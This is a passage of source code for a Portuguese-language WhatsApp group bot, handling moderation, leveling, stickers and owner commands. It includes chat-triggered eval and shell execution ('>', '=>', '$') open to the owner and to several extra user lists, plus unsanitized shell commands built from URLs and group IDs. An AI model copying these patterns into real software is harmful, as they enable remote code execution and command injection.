const numerodono = [`${nmrdn}`, `${nescessario.dono1}@s.whatsapp.net`, `${nescessario.dono2}@s.whatsapp.net`, `${nescessario.dono3}@s.whatsapp.net`, `${nescessario.dono4}@s.whatsapp.net`, `${nescessario.dono5}@s.whatsapp.net`, `${nescessario.dono6}@s.whatsapp.net`]

//============(SORTEIO-CONST)============\\

const { infosorteio } = require('./armor/js/infosorteio.js')

//===========(enviar.espere)=============\\

const { mensagens } = require('./armor/js/aleatoria.js');

const { sortear } = require('./armor/js/aleatoria.js');

var enviarmen = mensagens[Math.floor(Math.random() * mensagens.length)] 
//========================================\\

//=======(ADMS/DONO/ETC..CONST)========\\

const quoted = info.quoted ? info.quoted : info

const isBot = info.key.fromMe ? true : false

const SoDono = numerodono.includes(sender) || isBot

const DonoOficial = setting.numerodono.includes(sender) 

const isPremium = premium.includes(sender)

const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

const isGroupAdmins = groupAdmins.includes(sender) || false 

//============(FUN√á√ïES)============\\

const isWelkom2 = isGroup ? welkom2.includes(from) : true

const isVote = isGroup ? voting.includes(from) : false

const isModobn =  isGroup ? modobn.includes(from) : true

const isNsfw =  isGroup ? nsfw.includes(from) : true

const isSimi = isGroup ? samih.includes(from) : false

const isSimi2 = isGroup ? samih2.includes(from) : false

const isBanned = ban.includes(sender)

//===========(ANTIS-PROTE√á√ïES)===========\\

const isAntifake = isGroup ? antifake.includes(from) : false

const isAntiCtt = isGroup ? antictt.includes(from) : false

const isAnticatalogo = isGroup ? anticatalogo.includes(from) : false

const isAntiFlood = isGroup ? antiflood.includes(from) : false	

const isnit = nit.includes(sender) 

const isAntiLinkHard = isGroup ? antilinkhard.includes(from) : false

const isAutofigu = isGroup ? autofigu.includes(from) : false

const isAntilinkgp = isGroup ? antilinkgp.includes(from) : false

const isAntiPorn = isGroup ? antiporn.includes(from) : false

const isAntiAudio = isGroup ? antiaudio.includes(from) : false	
	
const isAntiImg = isGroup ? antiimg.includes(from) : false

const isAntiSticker = isGroup ? antisticker.includes(from) : false

const isAntiNotas = isGroup ? antinotas.includes(from) : false

const Antidoc = isGroup ? antidoc.includes(from) : false

const Antiloc = isGroup ? antiloc.includes(from) : false

const isAntiVid = isGroup ? antivid.includes(from) : false	

const ischyt = chyt.includes(sender)

const isAntiPv = (antipv.indexOf('Ativado') >= 0) ? true : false	

const isAnticall = (anticall.indexOf('Ativado') >= 0) ? true : false

const isPalavrao = isGroup ? palavrao.includes(from) : false	

const isViewOnce = (type == 'viewOnceMessage')

//=======================================\\

if(botoff.includes(from) && !SoDono) return 

enviar = {
espere: `${enviarmen}`,
successo: 'Ô∏è‚ù¨ ‚úî ‚ù≠ Sucesso üñ§',
levelon: '‚ù¨ ‚úî ‚ù≠ *leveling* *ativado*',
leveloff: '‚ù¨ X ‚ù≠  *leveling* *desativado*',
levelnoton: '‚ù¨ X ‚ù≠ *leveling n√£o ativado*',
levelnol: '*error* 0 ¬∞-¬∞',
error: {
stick: '*falhou, tente novamente ^_^*',
Iv: 'Link invalido ‚òπÔ∏è'
},
msg: {
grupo: '[‚ùó] Este comando s√≥ pode ser usado em grupos! ‚ùå',
premium: '[‚ùó] _Para adiquirir o vip acesse o painel de compra lembre de colocar corretamente o n√∫mero do seu whatsapp no site para receber o acesso automaticamente_',
mod: `[‚ùó] ESTE PEDIDO √â ESPEC√çFICO PARA USUARIO MOD ${setting.NickDono}*`,
banido: '‚ùå Voc√™ foi banido de utilizar os comandos, entre em contato com o propriet√°rio pra saber o porque ‚ùå' ,
donosmt: '[‚ùó] Este √© um recurso especial para o propriet√°rio ‚ùå',
donosmt2: '[‚ùó] Este √© um recurso especial para o propriet√°rio ‚ùå',
adm: '[‚ùó] Este comando s√≥ pode ser usado por administradores de grupo! ‚ùå',
Badmin: ' [‚ùó] Este comando s√≥ pode ser usado quando o bot se torna administrador! ‚ùå',
}
}

//=========(CONSTS-FUN√á√ïES)============\\

const isWelkom = isGroup ? welkom.includes(from) : false

const issupre = supre.includes(sender)

const isLevelingOn = isGroup ? _leveling.includes(from) : false

const isBanchat = isGroup ? bancht.includes(from) : false	

//=====================================\\


//==========(VERIFICADO)===============\\


blalogoofc = getBuffer(`${logo}`)


var selo = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${NomeDoBot}`, 'jpegThumbnail': blalogoofc}}}

//=====================================\\

const reply = (texto) => {
conn.sendMessage(from, { text: texto }, {quoted: info}).catch(e => {
console.log(e)
})
}

const getGroup = async function(totalchat){
let grup = []
let a = []
let b = []
for (c of totalchat){
a.push(c.id)
}
for (d of a){
if (d && d.includes('g.us')){
b.push(d)
}
}
for (e of b){
let ingfo = await conn.groupMetadata(e)
grup.push(ingfo)
}
return grup
}  


const isUrl = (url) => {
if(linkfy.find(url)[0]) return true
return false
}	

const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00"){
var tempo = 'Boa madrugada'
                                        } 
if(time2 > "05:30:00"){
var tempo = 'Bom dia'
                                        }
if(time2 > "12:00:00"){
var tempo = 'Boa tarde'
                                        }
if(time2 > "19:00:00"){
var tempo = 'Boa noite'
                                        }


const getFileBuffer = async (mediakey, MediaType) => {
  
const stream = await downloadContentFromMessage(mediakey, MediaType)

let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

const sendSticker = (from, filename, info) => {
conn.sendMessage(from, {sticker: filename}, {quoted: info})
}

const sendImage = (ytb) => {
conn.sendMessage(from, {image: ytb}, {quoted:info})
}


const sendMess = (hehe, ytb) => {
conn.sendMessage(hehe, {text: ytb})
}


const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? conn.sendMessage(from, {text: teks.trim(), mentions: memberr}) : conn.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
	
const costum = (pesan, tipe, target, target2) => {
conn.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
}


const groupIdWelcomed = []	
for(let obj of welcome_group) groupIdWelcomed.push(obj.id)

const groupIdBye = []
for(let obj of bye_group) groupIdBye.push(obj.id)

const isWelcomed = (groupIdWelcomed.indexOf(from) >= 0) ? true : false

const isByed = (groupIdBye.indexOf(from) >= 0) ? true : false

const groupIdWelcomed2 = []	

for(let obj of welcome_group2) groupIdWelcomed2.push(obj.id)

const groupIdBye2 = []

for(let obj of bye_group2) groupIdBye2.push(obj.id)


const isWelcomed2 = (groupIdWelcomed2.indexOf(from) >= 0) ? true : false

const isByed2 = (groupIdBye2.indexOf(from) >= 0) ? true : false	
	
	
//=====(FUN√á√ÉO-CHECAR-LIMIT)====\\
const checkLimit = (sender) => {
let found = false
for (let lmt of _limit) {
if (lmt.id === sender) {
let limitCounts = limitawal - lmt.limit
if (limitCounts <= 0) return conn.sendMessage(from,{text: `[üëæ] *LIMIT ESGOTADO*\n\n_Nota : para obter mais limit compre usando *${prefix}buylimit* ou suba de n√≠vel...`},{sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: info})
conn.sendMessage(from, {text: jrpl.limitcount(limitCounts)}, { quoted : info})
found = true
}
}
if (found === false) {
let obj = { id: sender, limit: 0 }
_limit.push(obj)
fs.writeFileSync('./datab/grupos/limit.json', JSON.stringify(_limit))
conn.sendMessage(from, {text: jrpl.limitcount(limitCounts)}, { quoted : info})
}
} 
							
	//funtion limitado
const isLimit = (sender) =>{ 
if (issupre) {return false;}
let position = false
for (let i of _limit) {
if (i.id === sender) {
let limits = i.limit
if (limits >= limitawal ) {
position = true
conn.sendMessage(from, {text: jrpl.limitend(pushname)}, {sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: info})
return true
} else {
_limit
position = true
return false
}
}
}
if (position === false) {
const obj = { id: sender, limit: 0 }
_limit.push(obj)
fs.writeFileSync('./datab/grupos/limit.json',JSON.stringify(_limit))
return false
}
}
	
const sendFileFromUrl = async (from, url, caption, info, men) => {
let mime = ''; 
let res = await axios.head(url)
mime = res.headers['content-type'] 
if (mime.split("/")[1] === "gif") { 
return conn.sendMessage(from, {video: await getBuffer(url),
caption: caption, gifPlayback: true, 
mentions: men ? men : []}, {quoted: info}) 
}
 
let type = mime.split("/")[0]+"Message" 
if(mime === "application/apk"){ 
return conn.sendMessage(from, {document: await getBuffer(url), mimetype: 'application/apk', 
caption: caption, mentions: men ? men : []}, {quoted: info}) 
} 

if(mime.split("/")[0] === "image"){ 
return conn.sendMessage(from, {image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: info}) 
}
if(mime.split("/")[0] === "video"){ 
return conn.sendMessage(from, {video: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: info}) 
} 
if(mime.split("/")[0] === "audio"){ 
return conn.sendMessage(from, {audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio'}, {quoted: info}) 
}
}
	
const sendMediaURL = async(to, url, text ="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
conn.sendMessage(to, {type: media, mimetype: mime, caption: text, contextInfo: {"mentionedJid": mids}}, { quoted: info})
fs.unlinkSync(filename)
});
}   

/********** ANTI NOME MODIFICADO **********/
function isDoubleByte(str) {
for (let i = 0, n = str.length; i < n; i++) {
if (str.charCodeAt(i) > 255) {
return true;
}
}
return false;
}

const convertBytes = function(bytes) {
const sizes = ["Bytes", "KB", "MB", "GB", "TB"]
if (bytes == 0) {
return "n/a"
}

const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)))
if (i == 0) {
return bytes + " " + sizes[i]
}

return (bytes / Math.pow(1024, i)).toFixed(1) + " " + sizes[i]
}

// ENVIAR BOT√ÉO COM TEXTO
const sendBtext = async (id, text1, desc1, but = [], vr) => {
buttonMessage = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
conn.sendMessage(id, buttonMessage, {quoted: vr})
}

// ENVIAR BOT√ÉO COM IMAGEM
const sendBimg = async (id, img1, text1, desc1, but = [], vr) => {
buttonMessage = {
image: {url: img1},
caption: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
conn.sendMessage(id, buttonMessage, {quoted: vr})
}

// ENVIAR MENU COM GIF OU QUALQUER DO TIPO
const sendGifButao = async (id, gif1, text1, desc1, but = [], vr) => {
buttonMessage = {
video: {url: gif1},
caption: text1,
gifPlayback: true, 
footerText: desc1,
buttons: but,
headerType: 4
}
conn.sendMessage(id, buttonMessage, {quoted: vr})
}

// PRA ENVIAR BOT√ÉO DE TEMPLATE
const sendBimgT = async (id, img1, text1, desc1, but = [], vr) => {

templateMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
templateButtons: but,
}
conn.sendMessage(id, templateMessage, {quoted: vr})
}

const sendlistA = async (id, txt1, txt2, title1, btext, but) => {

const sections = but

const listMessage = {
text: txt1,
footer: txt2,
title: title1,
buttonText: btext,
sections
}
conn.sendMessage(id, listMessage)  
}

const enviarfigu = async (figu, tag) => {
bla = fs.readFileSync(figu)
conn.sendMessage(from, {sticker: bla}, {quoted: info})
}

const enviarfiguUrl = async (link) => {
ranp = getRandom('.gif')
rano = getRandom('.webp')
ini_buffer = `${link}`
exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 320:320 ${rano}`, (err) => {
fs.unlinkSync(ranp)
buff = fs.readFileSync(rano)
conn.sendMessage(from, {sticker: buff}, {quoted: info}).catch(e => {
})
fs.unlinkSync(rano)
})
}

if(isAutofigu && isGroup) {
if(type == "videoMessage") {
buff = await getFileBuffer(info.message.videoMessage, 'video')
ran = getRandom('.'+await getExtension(info.message.videoMessage.mimetype))
fs.writeFileSync(ran, buff)
res = await upload(buff)
enviarfiguUrl(`${res}`)
fs.unlinkSync(ran, buff)
} else if(type == "imageMessage") {
buff = await getFileBuffer(info.message.imageMessage, 'image')
ran = getRandom('.'+await getExtension(info.message.imageMessage.mimetype))
fs.writeFileSync(ran, buff)
res = await upload(buff)
enviarfiguUrl(`${res}`)
fs.unlinkSync(ran, buff)
}
}


var nmrdnofc1 = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "")

if(isGroup && fs.existsSync(`./func/afk/afk-@${nmrdnofc1}.json`)) {
if(budy.includes(`@${nmrdnofc1}`)) {
const tabelin = JSON.parse(fs.readFileSync(`./func/afk/afk-@${nmrdnofc1}.json`));  

txt = `- Ol√°, o ${NickDono} Est√° ausente.\n\n - Desde: ${tabelin.Ausente_Desde}\n\n- üòá Mensagem de aus√™ncia : ${tabelin.Motivo_Da_Aus√™ncia}`

conn.sendMessage(from, {text: txt}, {quoted: info})
}
}
 
if(isGroup && fs.existsSync(`./func/sairgp/sairgp-${from}.json`)) {

const sairalg = JSON.parse(fs.readFileSync(`./func/sairgp/sairgp-${from}.json`)); 

datinhaofc = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

if(datinhaofc == sairalg.Data_de_sair) {

group = await conn.groupMetadata(from)
member = group['participants']
mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
options = {
text: `Aten√ß√£o membros, aqui quem est√° falando √© o bot com a mensagem autom√°tica, sairei do grupo por o tempo que foi realizado no dia que alugou, completou 30 dias....`,
mentions: mem,
quoted: info
}
conn.sendMessage(from, options)

exec(`cd func && cd sairgp && rm sairgp-${from}.json`)

setTimeout(async() => {
reply(`${prefix}sairgp`)
}, 5000)
}
}
 
if(fs.existsSync("dados_store.json")) {
statsObj = fs.statSync('./dados_store.json')  

if(convertBytes(statsObj.size) >= "20 MB") {
exec("rm dados_store.json")
}
}
 
async function fgptotale() {
if(isGroup && fs.existsSync(`./func/fgp-${from}.json`)) {
 
var json_fgp = JSON.parse(fs.readFileSync(`./func/fgp-${from}.json`))
 
var hora_d_agr = moment.tz('America/Sao_Paulo').format('HH/mm/ss'); 

switch(hora_d_agr){
case json_fgp.abrirgp: {
await conn.groupSettingUpdate(from, 'not_announcement')
setTimeout(async () => {
var blamsgfgp = `./func/horario-grupo-a-b/mensagem_de_abrir-fechar-${from}.json`
fs.writeFileSync(blamsgfgp, JSON.stringify("_- PROGRAMA√á√ÉO DE - _\n\nFECHAR / ABRIR GRUPO\n\n_- REALIZANDO A√á√ÉO _-", null, 2))
if(fs.existsSync(blamsgfgp)) { 
blarmsgfc = JSON.parse(fs.readFileSync(blamsgfgp))
}
await conn.sendMessage(from, {text: blarmsgfc})
fs.unlinkSync(blamsgfgp)
}, 900)
}
break

case json_fgp.fechargp: {
await conn.groupSettingUpdate(from, 'announcement')
setTimeout(async () => {
var blamsgfgp = `./func/horario-grupo-a-b/mensagem_de_abrir-fechar-${from}.json`  
fs.writeFileSync(blamsgfgp, JSON.stringify("_- PROGRAMA√á√ÉO DE - _\n\nFECHAR / ABRIR GRUPO\n\n_- REALIZANDO A√á√ÉO _-", null, 2))
if(fs.existsSync(blamsgfgp)) { 
blarmsgfc = JSON.parse(fs.readFileSync(blamsgfgp))
}
await conn.sendMessage(from, {text: blarmsgfc})
fs.unlinkSync(blamsgfgp)
}, 900)
}
break

default:
}
} 
}

setInterval(fgptotale, 0)

//========================================\\
//BAN CHATS/GRUPOS
if (isBanchat && !isGroupAdmins && !SoDono){
if (!isGroupAdmins && !SoDono) return
if (budy2.startsWith('unbangp')){
if (isCmd && !isBanchat && !isGroupAdmins) return reply(`Este grupo esta banido, ou seja n√£o estou ouvindo ningu√©m`)
let lfd = bancht.indexOf(from)
bancht.splice(lfd, 1)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo desbanido...`)
}
}

//=======FUNCIONALIDADE PATENTE=========\\
const nivelAtual = getLevelingLevel(sender)
var patt = 'Bronze Iü•â'
if (nivelAtual === 1) {patt = 'Bronze  Iü•â' } else if (nivelAtual === 2) {patt = 'Bronze IIü•â'} else if (nivelAtual === 3) {patt = 'Bronze  IIIü•â'} else if (nivelAtual === 4) {patt = 'Bronze  IVü•â'} else if (nivelAtual === 5) {patt = 'Bronze  Vü•â'} else if (nivelAtual === 6) {patt = 'Prata Iü•à'} else if (nivelAtual === 7) {patt = 'Prata IIü•à'} else if (nivelAtual === 8) {patt = 'Prata IIIü•à'} else if (nivelAtual === 9) {patt = 'Prata IVü•à'} else if (nivelAtual === 10) {patt = 'Prata Vü•à'} else if (nivelAtual === 11) {patt = 'Ouro Iü•á'} else if (nivelAtual === 12) {patt = 'Ouro IIü•á'} else if (nivelAtual === 13) {patt = 'Ouro IIIü•á'} else if (nivelAtual === 14) {patt = 'Ouro IVü•á'} else if (nivelAtual === 15) {patt = 'Ouro Vü•á'} else if (nivelAtual === 16) {patt = 'Campe√£o IüèÜ'} else if (nivelAtual === 17) {patt = 'Campe√£o IIüèÜ'} else if (nivelAtual === 18) {patt = 'Campe√£o IIIüèÜ'} else if (nivelAtual === 19) {patt = 'Campe√£o IVüèÜ'} else if (nivelAtual === 20) {patt = 'Campe√£o VüèÜ'} else if (nivelAtual === 21) {patt = 'Diamante I üíé'} else if (nivelAtual === 22) {patt = 'Diamante II üíé'} else if (nivelAtual === 23) {patt = 'Diamante III üíé'} else if (nivelAtual === 24) {patt = 'Diamante IV üíé'} else if (nivelAtual === 25) {patt = 'Diamante V üíé'} else if (nivelAtual === 26) {patt = 'Mestre I üêÇ'} else if (nivelAtual === 27) {patt = 'Mestre II üêÇ'} else if (nivelAtual === 28) {patt = 'Mestre III üêÇ'} else if (nivelAtual === 29) {patt = 'Mestre IV üêÇ'} else if (nivelAtual === 30) {patt = 'Mestre V üêÇ'} else if (nivelAtual === 31) {patt = 'M√≠tico I üîÆ'} else if (nivelAtual === 32) {patt = 'M√≠tico II üîÆ'} else if (nivelAtual === 33) {patt = 'M√≠tico III üîÆ'} else if (nivelAtual === 34) {patt = 'M√≠tico IV üîÆ'} else if (nivelAtual === 35) {patt = 'M√≠tico V üîÆ'} else if (nivelAtual === 36) {patt = 'God Iüï¥'} else if (nivelAtual === 37) {patt = 'God IIüï¥'} else if (nivelAtual === 38) {patt = 'God IIIüï¥'} else if (nivelAtual === 39) {patt = 'God IVüï¥'} else if (nivelAtual === 40) {patt = 'God Vüï¥'} else if (nivelAtual > 41) {patt = 'üõêGrande Mestreüõê'}
//========================================\\



//==========(FUN√á√ÉO DE LEVEL)=============\\
if (isGroup && isLevelingOn) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
const amountXp = Math.floor(Math.random() * 10) + 500
const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
const getLevel = getLevelingLevel(sender)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
await reply(`            ‚ó™ LEVEL UP ‚ó™\n\n‚îú‚îÄ ‚ùè N√öMERO: ${sender.split("@")[0]}.                                                                                       ‚îú‚îÄ ‚ùè *PATENTE*: ${patt}\n‚îú‚îÄ ‚ùè XP: ${getLevelingXp(sender)}\n‚îî‚îÄ ‚ùè LEVEL: ${getLevel} -> ${getLevelingLevel(sender)}`)
}
} catch (err) {
console.error(err)
}
}
//=======================================\\



const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './sticker' + names + '.png', async function () {
console.log('enviando sticker');
let filess = './sticker' + names + '.png'
let asw = './sticker' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
conn.sendMessage(to, {sticker: media}, {sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: info})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}

const sleep = async (ms) => {return new Promise(resolve => setTimeout(resolve, ms))}

//=========(isQuoted/consts)=============\\
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
             

///////////ANTI-SPAM/////////
if (isCmd && isFiltered(sender) && !isGroup) {
console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
const ff = `*„Äå ‚ùó „ÄçFlood detectado, espere 5 segundos , na proxima vez tenta digitar os comandos mais devagar*`
return reply(ff)
}
if (isCmd && isFiltered(sender) && isGroup) {
console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
const ff1 = `*„Äå ‚ùó „ÄçFlood detectado, espere 5 segundos, na proxima vez tenta digitar os comandos mais devagar*`
return reply(ff1)
}

//////BLOCK CMD///////

if(isGroup){
const checar = getComandos(from)
if(checar === undefined) addComandosId(from)
}
if(isGroup && isCmd && !SoDono && !isnit && getComandoBlock(from).includes(command))return reply('comando blockeado')

////FIM/////,

if (!isGroup && isCmd) console.log('\033[0;35m~\x1b[1;37m>', '[\x1b[1;32mCOMANDO\x1b[1;37m]', time, color(command), 'do ', color(sender.split('@')[0]))

if (!isGroup && !isCmd && !info.key.fromMe) console.log('\033[0;35m~\x1b[1;37m>', '[\033[0;35mMENSAGEM\x1b[1;37m]', 'do ', color(sender.split('@')[0]))

if (isCmd && isGroup) console.log('\033[0;35m~\x1b[1;37m>', '[\x1b[1;32mCOMANDO\x1b[1;37m]', time, color(command), 'do ', color(sender.split('@')[0]), 'no gp: ', color(groupName))

if (!isCmd && isGroup && !info.key.fromMe) console.log('\033[0;35m~\x1b[1;37m>', '[\033[0;35mMENSAGEM\x1b[1;37m]',  'do ', color(sender.split('@')[0]), 'no gp: ', color(groupName))

//=================================\\

async function AntilinkHardF() {
if(isUrl(budy2) && isAntiLinkHard && isGroupAdmins && isBotGroupAdmins) {
linkgpp = await conn.groupInviteCode(from)
if(!isUrl(budy2)) return 
if(budy2.includes(`${linkgpp}`)) return 
if(isBot) return 
reply('*Link detectado, por√©m usu√°rio √© admin*')
}

if(isUrl(budy2) && isAntiLinkHard && !isGroupAdmins && isBotGroupAdmins) {
linkgpp = await conn.groupInviteCode(from)
if(budy2.match(`${linkgpp}`)) return reply('Link do nosso grupo, n√£o irei remover.. ')  
if(!isUrl(budy2)) return 
conn.groupParticipantsUpdate(from, [sender], 'remove')
}
} 
AntilinkHardF()

if(isUrl(body) && isAntilinkgp && isGroup && isBotGroupAdmins) {
if(!isAntilinkgp) return
if(!isUrl(body)) return 
if(isGroupAdmins) return reply("Voc√™ √© adm, n√£o removerei voc√™..") 
if(budy2.includes("chat.whatsapp.com/")){
if(!budy2.includes("chat.whatsapp.com/")) return
if(isBot) return 
linkgpp = await conn.groupInviteCode(from)
if(budy.match(`${linkgpp}`)) return reply('Link do nosso grupo, n√£o irei remover.. ')  
reply('*Link de grupo detectado, punindo usu√°rio...*')
conn.groupParticipantsUpdate(from, [sender], 'remove')
}
}

//========(CONTADOR-DE-MENSAGENS)========\\

const groupIdscount = []
const numbersIds = []
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./datab/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}


//======================================\\

//===============(AUTO-BAN)=============\\
const dbids = []
for(i=0;i<adeuscara.length;++i) {
dbids.push(adeuscara[i].groupId)
}
const isAdeusCara = (isGroup && dbids.indexOf(from) >= 0) ? true : false

//======================================\\


//============(EVAL-EXECU√á√ïES)===========\\

if (budy.startsWith('>')){
try {
if(info.key.fromMe) return 
if(!SoDono && !isnit && !issupre && !ischyt && !issupre && !ischyt) return
if(budy.includes("keyapissh") && !isnit) return reply("Fofo voc√™ em kkkkk")
console.log('[', color('EVAL', 'silver'),']', color(moment(info.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(budy))

return reply(JSON.stringify(eval(budy.slice(2)),null,'\t')) 
} catch (e){
reply(e)
}
}

if (budy.startsWith('=>')){
try {
if(info.key.fromMe) return   
if (!SoDono && !isnit && !issupre && !ischyt && !issupre && !ischyt) return 
if(budy.includes("keyapissh") && !isnit) return reply("Fofo voc√™ em kkkkk")
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}

reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch (e) {
reply(String(e))  
}
}


if (body.startsWith('$')) {
if(info.key.fromMe) return 
if(!SoDono && !isnit) return 
if(budy.includes("keyapissh") && !isnit) return reply("Fofo voc√™ em kkkkk")
exec(q, (err, stdout) => {
if(err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

//======================================\\


//======(ANTI-IMAGEM)========\\
if(isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
if (info.key.fromMe) return
if(isGroupAdmins) return conn.sendMessage(from, {text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-STICKER)========\\
if(isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
if (info.key.fromMe) return
if(isGroupAdmins) return conn.sendMessage(from, {text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

if(Antidoc && isBotGroupAdmins && type == 'documentMessage') {
if (info.key.fromMe) return
if(isGroupAdmins) return conn.sendMessage(from, {text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

// ANTI NOTAS FAKES ======================>

if(isAntiNotas && bady.toString().match(/(üí≥|üíé|üí∏|üíµ|üí∑|üí∂|ü™ô|üí∞|ü§ë|‚öñÔ∏è)/gi) && isBotGroupAdmins) {
if(isGroupAdmins || SoDono) return 
if(type == 'stickerMessage') return
let verificar = bady.toString().match(/(üí≥|üíé|üí∏|üíµ|üí∑|üí∂|ü™ô|üí∞|ü§ë|‚öñÔ∏è)/gi)
if (verificar && bady.length < 100) return  
